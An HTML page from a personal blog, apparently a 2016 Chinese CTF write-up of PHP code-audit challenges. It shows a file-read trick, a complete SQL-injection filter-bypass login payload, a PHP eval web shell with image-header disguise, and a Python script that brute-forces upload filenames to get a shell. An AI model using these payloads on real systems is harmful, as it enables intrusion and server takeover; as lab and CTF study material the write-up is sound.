@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <title> 简单总结一下雨神的审计题目 - Virink's Blog </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="author" content="Virink">
+    <meta name="keyword" content="virink audit php python docker hacker bug exp vuls">
+    <meta name="description" content="This is a blog that I was recorded some personal journals and some articles, it maybe can help you in some way.">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="简单总结一下雨神的审计题目 - Virink's Blog">
+    <meta property="og:url" content="http://www.virzz.com/2016/04/24/briefly_summarizes_the_rain_god_audit_subject/index.html">
+    <meta property="og:site_name" content="Virink's Blog">
+    <meta property="og:description" content="This is a blog that I was recorded some personal journals and some articles, it maybe can help you in some way.">
+    <meta property="og:updated_time" content="2016-10+29T16:19:22+08:00">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="简单总结一下雨神的审计题目 - Virink's Blog">
+    <meta name="twitter:description" content="This is a blog that I was recorded some personal journals and some articles, it maybe can help you in some way.">
+    <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+    <link rel="icon" href="/static/img/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="/static/css/uno.css">
+    <script type="text/javascript" src="/static/js/jquery.min.js"></script>
+</head>
+
+<body>
+    <span class="mobile btn-mobile-menu">
+        <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+    </span>
+    <header class="panel-cover">
+        <div class="panel-main">
+            <div class="panel-main__inner panel-inverted">
+                <div class="panel-main__content">
+                    <a href="/" title="link to homepage for Virink's Blog">
+                        <img src="/static/img/avatar.png" width="80" alt="Virink's Blog logo" class="panel-cover__logo logo" />
+                    </a>
+                    <h1 class="panel-cover__title panel-title">
+                        <a href="/" title="link to homepage"> Virink </a>
+                    </h1>
+                    <hr class="panel-cover__divider" />
+                    <p class="panel-cover__description">A boring and silly single dog, who can't do anything except zhuangbi.</p>
+                    <div id="tagscloud" class="panel-cover__divider">
+                        <a href="/tags/audit" class="tagc1">Audit</a><a href="/tags/web" class="tagc2">Web</a><a href="/tags/writeups" class="tagc3">Writeups</a><a href="/tags/python" class="tagc4">Python</a><a href="/tags/vuls" class="tagc5">Vuls</a><a href="/tags/thinking" class="tagc1">Thinking</a><a href="/tags/ctf" class="tagc2">CTF</a><a href="/tags/other" class="tagc3">Other</a><a href="/tags/flask" class="tagc4">Flask</a><a href="/tags/go" class="tagc5">Golang</a><a href="/tags/docker" class="tagc1">Docker</a><a href="/tags/php" class="tagc2">PHP</a><a href="/tags/tools" class="tagc3">Tools</a>
+                    </div>
+                    <div class="navigation-wrapper">
+                        <nav class="cover-navigation cover-navigation--primary">
+                            <ul class="navigation">
+                                <li class="navigation__item"> <a href="/#blog" title="" class="blog-button"> Blog </a></li>
+                                <li class="navigation__item"> <a href="/about" title="" class=""> About</a></li>
+                                <li class="navigation__item"> <a href="/links" title="" class=""> Links </a></li>
+                            </ul>
+                        </nav>
+                        <hr class="panel-cover__divider" />
+                        <nav class="cover-navigation navigation--social">
+                            <ul class="navigation">
+                                <!-- Github -->
+                                <li class="navigation__item">
+                                    <a href="https://github.com/virink" target="_blank">
+                                        <i class='fa fa-github' aria-hidden="true"></i>
+                                        <span class="label"> GitHub </span>
+                                    </a>
+                                </li>
+                                <!-- Twitter -->
+                                <li class="navigation__item">
+                                    <a href="https://twitter.com/virinkz" target="_blank">
+                                        <i class='fa fa-twitter' aria-hidden="true"></i>
+                                        <span class="label"> Twitter </span>
+                                    </a>
+                                </li>
+                                <!-- Twitter -->
+                                <li class="navigation__item">
+                                    <a href="https://telegram.me/virink" target="_blank">
+                                        <i class='fa fa-paper-plane' aria-hidden="true"></i>
+                                        <span class="label"> Telegram </span>
+                                    </a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            <div class="panel-cover--overlay"> </div>
+        </div>
+    </header>
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            <article class="post-container post-container--single">
+                <header class="post-header">
+                    <div class="post-meta">
+                        <time datetime="2016-04-24 22:26:18" class="post-meta__date date">2016-04-24 22:26:18</time> &#8226;
+                        <span class="post-meta__tags tags">
+                    <font class="categories"></font>
+                    <font class="tags">
+                      <a class="tags-link" href="/tags/web/">Web</a> , <a class="tags-link" href="/tags/writeups/">Writeups</a> , <a class="tags-link" href="/tags/ctf/">CTF</a>
+                    </font>
+                  </span>
+                    </div>
+                    <h1 class="post-title"> 简单总结一下雨神的审计题目 </h1>
+                </header>
+                <section class="post">
+                    <h2>0x00</h2>
+<p>鏈接估計失效了、就不發出來了。</p>
+<h2>0x01 任意文件讀取</h2>
+<p>說好的源碼審計、居然就跳到了sql注入。</p>
+<p>看了下robors.txt頁面，有亮點！</p>
+<p>基本文件都寫出來了。</p>
+<pre><code>User-agent: *
+Disallow: /login.php
+Disallow: /read.php
+Disallow: /index.php
+Disallow: /common.php
+Disallow: /search.php
+Disallow: /function.php
+</code></pre>
+<p><strong>read.php</strong></p>
+<p>打開頁面，提示<code>The file parameter is empty,Please input it</code></p>
+<p>根據提示加上<code>?file=read.php</code></p>
+<p>又是提示<code>The parameter is not allow contain php!</code></p>
+<p>簡單測試下,這樣就成功讀取了。<code>?file=/read.php</code></p>
+<h2>0x02 MySQL的特性Like</h2>
+<p>這題視乎在哪裏見過的樣子。</p>
+<pre><code>&lt;?php
+if(!empty($search)){
+    $result = mysql_fetch_array(mysql_query("select qq from qq where qq like '$search'"));
+    mysql_close();
+    if($result){
+        echo "&lt;center style=\"font-size:36px; color:red\"&gt;$result[qq]&lt;/center&gt;";
+    }else{
+        echo "&lt;center style=\"font-size:36px; color:red\"&gt;无此记录&lt;/center&gt;";
+    }
+}
+?&gt;
+</code></pre>
+<p>根據MySQL的特性,like條件中<code>_</code>可以表示一個任意字符，多來幾次就成功查到了。（10位的QQ）</p>
+<h2>0x03 繞過Fifter</h2>
+<p>這道題目，百分之七十的代碼都是用來過濾的。Orz</p>
+<pre><code>$sql = "select * from admin where username='$username' or id='$id' or email = '$email'";
+$result = @mysql_fetch_array(mysql_query($sql));
+mysql_close();
+if ($result) {
+    if (think_ucenter_md5($password, $result['salt']) === $result['password']) {
+        $_SESSION['login'] = 1;
+        $_SESSION['auth'] = 1;
+</code></pre>
+<p>目的就是以<code>$username</code>、<code>$id</code>、<code>$email</code>三個變量構造payload。</p>
+<p>此處需要<code>union select</code>覆蓋<code>salt</code>和<code>password</code>。</p>
+<p>你能想像到的特殊字符都給過濾了。</p>
+<pre><code>if (strlen($username) &gt; 20) {
+    $username = substr($username, 0, 20); 
+}
+</code></pre>
+<p><code>addslashes()</code>轉義加<code>username</code>截斷可以逃逸一個引號。</p>
+<pre><code>username = x*19%00
+select * from admin where username='x*19\' or id='$id' or email = '$email'
+</code></pre>
+<p><code>id</code>處也做了處理</p>
+<pre><code>$id=preg_replace('#[^\w\s]#i','',$id);
+</code></pre>
+<p>根據</p>
+<pre><code>$check= preg_match('/select|\'|\"|,|%|insert|update|delete|union|into|load_file|outfile|or|\/\*/i', $str); 
+if($check) { 
+    exit ("The data is unable to submit,Because it contain dengerous string,Please check it and clear it.");
+}
+
+$newstr="";
+while($newstr!=$str){
+    $newstr=$str;
+    $str = str_replace("union", "", $str);
+    $str = str_replace("update", "", $str);
+    $str = str_replace("into", "", $str);
+    $str = str_replace("exec", "", $str);
+    $str = str_replace("select", "", $str);
+    $str = str_replace("delete", "", $str);
+    $str = str_replace("declear"," ",$str);
+    $str = str_replace("insert", "", $str);
+}
+</code></pre>
+<p>成功在<code>id</code>注入<strong>or</strong></p>
+<pre><code>id=oexecr
+select * from admin where username='x*19\' or id='$id' or email = '$email'
+select * from admin where username='x*19\' or id='or' or email = '$email'
+</code></pre>
+<p>最腦洞的是<code>email</code>的構造。</p>
+<pre><code>if ($email &amp;&amp; !preg_match("/\A\w+[-+_]*\s?\w+@\w+\.\w{2,4}(\Z|\.\w{2,4})/", $email)) {  //允许输入 yu@qq.com || yu@qq.com.cn || yu_a@qq.com || yu-x@qq.com
+    exit("Email Wrong!");
+}
+foreach ($_REQUEST as $key =&gt; $value){
+    if (strpos($value, '(')) {
+        $filter = "UNION.+?SELECT|SELECT.+?FROM|MD5|0x|\/\*|\.\.\/|\.\/";
+        webscan_St0pAttack($key, $value, $filter, "GET");
+    }
+}
+</code></pre>
+<p>各種過濾傷腦，逗號 （<strong>,</strong>） 也過濾了。</p>
+<p>首先，我們得先把<code>@xx.xx</code>的郵箱格式給注釋掉。正則中存在<code>[-+_]*</code>明顯是讓用<code>-- x</code>的形式注釋。</p>
+<p>注釋之後的語句都無效了，那還怎麼union select？</p>
+<p>別擔心，有黑科技！！！</p>
+<p><strong>【黑科技 1 】</strong>
+換行之後可以跳出注釋！payload：<strong>%0a</strong></p>
+<p>這種<code>UNION.+?SELECT</code>也是利用<strong>%0a</strong>繞過！</p>
+<p>另外，題目裏的過濾函數大多數是對大小寫敏感的，大小寫混寫就能繞過了。</p>
+<p>比如，<code>Selexecect</code>什麼的！</p>
+<p>然後、我麼需要fuzz出純數字的sha1密文，這個就需要自己跑了。</p>
+<pre><code>function think_ucenter_md5($str, $key = 'ThinkUCenter')
+{
+    return '' === $str ? '' : md5(sha1($str) . $key);
+}
+</code></pre>
+<p>跑出來結果，password=aaaaanvejr&amp;key=1的時候的sha1密文為86989721238789742522421481132813</p>
+<pre><code>email=rlike-- a@abc.com.cn%0a1 oexecr id=8e0Unioexecn%0a(  Seexeclect*%0afrom((%0A%0ASeexeclect%2b1)a join (%0A%0ASeexeclect%2b1)b join (%0A%0ASeexeclect%2b1)c join (%0A%0ASeexeclect%2b86989721238789742522421481132813)d join (%0A%0ASeexeclect%2b1)e join (%0a%0aSeexeclect%2b1)f))%23
+
+select * from admin where username='x*19\' or id='or' or email = 'rlike-- a@abc.com.cn
+1 or id=8e0Unioexecn
+(  Select*
+from((
+
+Select+1)a join (
+
+Select+1)b join (
+Select+1)c join (
+
+Select+86989721238789742522421481132813)d join (
+
+Select+1)e join (
+
+Select+1)f))#'
+</code></pre>
+<p>成功突破!</p>
+<pre><code>/login.php?act=login
+
+id=oexecr
+&amp;username=vvvvvvvvvvvvvvvvvvv%00
+&amp;email=rlike-- a@abc.com.cn%0a1 oexecr id=8e0Unioexecn%0a(  Seexeclect*%0afrom((%0A%0ASeexeclect%2b1)a join (%0A%0ASeexeclect%2b1)b join (%0A%0ASeexeclect%2b1)c join (%0A%0ASeexeclect%2b86989721238789742522421481132813)d join (%0A%0ASeexeclect%2b1)e join (%0a%0aSeexeclect%2b1)f))%23
+&amp;password=aaaaanvejr
+&amp;submit=1
+</code></pre>
+<h2>0x04 上傳Shell</h2>
+<p>PHP黑科技繞過<code>if (strpos($content, '&lt;?php'))</code></p>
+<pre><code>&lt;script language=php&gt;@eval($_POST[1]);&lt;/script&gt;
+</code></pre>
+<p>PHP黑科技繞過<code>if (!getimagesize($file[tmp_name])) {</code></p>
+<pre><code>GIF89a
+</code></pre>
+<p>還有更折騰人的</p>
+<pre><code>    $destination_folder = './uploads/';
+    $destination_folder .= date('Y', time()) . "/" . date('m', time()) . "/";
+    if (!file_exists($destination_folder)) mkdir('./' . $destination_folder, 0777, true);
+    $file_pre = md5(time());
+
+    $realname = $file_pre . $filetype;
+    $destination = $destination_folder . $realname;
+
+    if (move_uploaded_file($file[tmp_name], $destination)) {
+        $file[name] = addslashes($file[name]);
+        mysql_query("Insert into files(filename,realname,path) values ('$file[name]','$realname','$destination_folder')");
+        mysql_close();
+        @unlink($_FILES['file']['tmp_name']);
+        exit('Upload success');
+
+    $result = @mysql_fetch_array(mysql_query("select * from files where filename = '$filename' and realname = '$realname'"));
+    if(!empty($filename) &amp;&amp; !empty($realname)){
+        if($result){
+            if(rename($result[path].$result[realname],$result[path].$result[filename])){
+                exit('rename success');
+            }
+        }else{
+            exit('No the file where in the database');
+        }
+    }
+</code></pre>
+<p>上傳一個文件之後就碰撞<code>md5(time()).gif</code></p>
+<p>然後就是想辦法截斷文件名達到<code>shell.php</code>的目的。</p>
+<p>其實我覺得<code>$file[name] = addslashes($file[name]);</code>是關鍵、然而我沒本事利用。</p>
+<p>本地測試環境的時候、發現，varchar的初始長度是255,會不會也是可以把文件名截斷。</p>
+<p>於是就fuzz文件名長度，最後發現文件名長度為40個字符。</p>
+<p>上傳 <code>v*36+.php.gif</code>文件就會被截斷成<code>v*36+.php</code></p>
+<p>成功getshell！</p>
+<p>flag在網站根目錄下的<code>ffffffffffffffffffffffffffffffffflag.txt</code>文件內！</p>
+<p><strong>miao{f9ac7a86927fee51ec92cab4a895c33a}</strong></p>
+<hr />
+<p><strong>fuzzfilename.py</strong></p>
+<pre><code>import hashlib, time, requests, sys
+
+def vrename(abc):
+    res = requests.get("http://xxx/sgbm/admin_yu_filemanage.php?motify=motify&amp;filename="+"v"*36+".php&amp;realname="+abc)
+    if 'rename success' in res.content:
+        print abc
+        sys.exit(0)
+
+def md5(src):
+    a = hashlib.md5()
+    a.update(str(src))
+    return a.hexdigest()
+
+if __name__ == '__main__':
+    tt = int(time.time())
+    for i in range(0,100):
+        a = md5(tt) + '.gif'
+        tt -= 1
+        vrename(a)
+</code></pre>
+                </section>
+                <section class="post-comments">
+                    <div class="ds-thread" data-thread-key="2016/04/24/briefly_summarizes_the_rain_god_audit_subject/index.html" data-title="简单总结一下雨神的审计题目" data-url="http://www.virzz.com/2016/04/24/briefly_summarizes_the_rain_god_audit_subject/index.html"></div>
+                    <script type="text/javascript">
+                        var duoshuoQuery = {short_name:"virink"};
+                        (function() {
+                            var ds = document.createElement('script');
+                            ds.type = 'text/javascript';ds.async = true;
+                            ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+                            ds.charset = 'UTF-8';
+                            (document.getElementsByTagName('head')[0] 
+                             || document.getElementsByTagName('body')[0]).appendChild(ds);
+                        })();
+                    </script>
+                </section>
+            </article>
+            <footer class="footer">
+                <span class="footer__copyright">&copy; 2016-2017 | ❤ <a href="mailto:virink@outlook.com"> Virink </a></span>
+            </footer>
+        </div>
+    </div>
+    <!-- The main JavaScript file for Casper -->
+    <script type="text/javascript">
+    jQuery.browser = {};
+        (function () {
+            jQuery.browser.msie = false;
+            jQuery.browser.version = 0;
+            if (navigator.userAgent.match(/MSIE ([0-9]+)\./)) {
+                jQuery.browser.msie = true;
+                jQuery.browser.version = RegExp.$1;
+            }
+        })();
+    </script>
+    <script src="/static/js/main.js"></script>
+    <script src="/static/js/tagcloud.js"></script>
+    <script src="/static/js/scale.fix.js"></script>
+    <script src="/static/js/jquery.imagesloaded.min.js"></script>
+    <script src="/static/js/gallery.js"></script>
+    <script src="/static/js/jquery.githubRepoWidget.min.js"></script>
+    <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({ tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} });
+    </script>
+    <!--kill ie6 -->
+    <!--[if IE 6]>
+      <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+    <![endif]-->
+    <!-- analytics -->
+    <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?cc5bfd8791cd2c8a318145b9213ed80f";
+      var s = document.getElementsByTagName("script")[0]; 
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+    <!-- totop -->
+    <div id="totop" style="position:fixed;bottom:50px;right:30px;cursor: pointer;">
+        <a title="back to top"><img style="width:30px;height:30px;" src="/static/img/totop.png" /></a>
+    </div>
+    <script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+    <!-- fancybox -->
+    <link rel="stylesheet" href="/static/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+    <script src="/static/fancybox/jquery.fancybox.pack.js"></script>
+    <script type="text/javascript">
+    (function($) {
+        $('.fancybox').fancybox();
+    })(jQuery);
+    </script>
+
+</html>
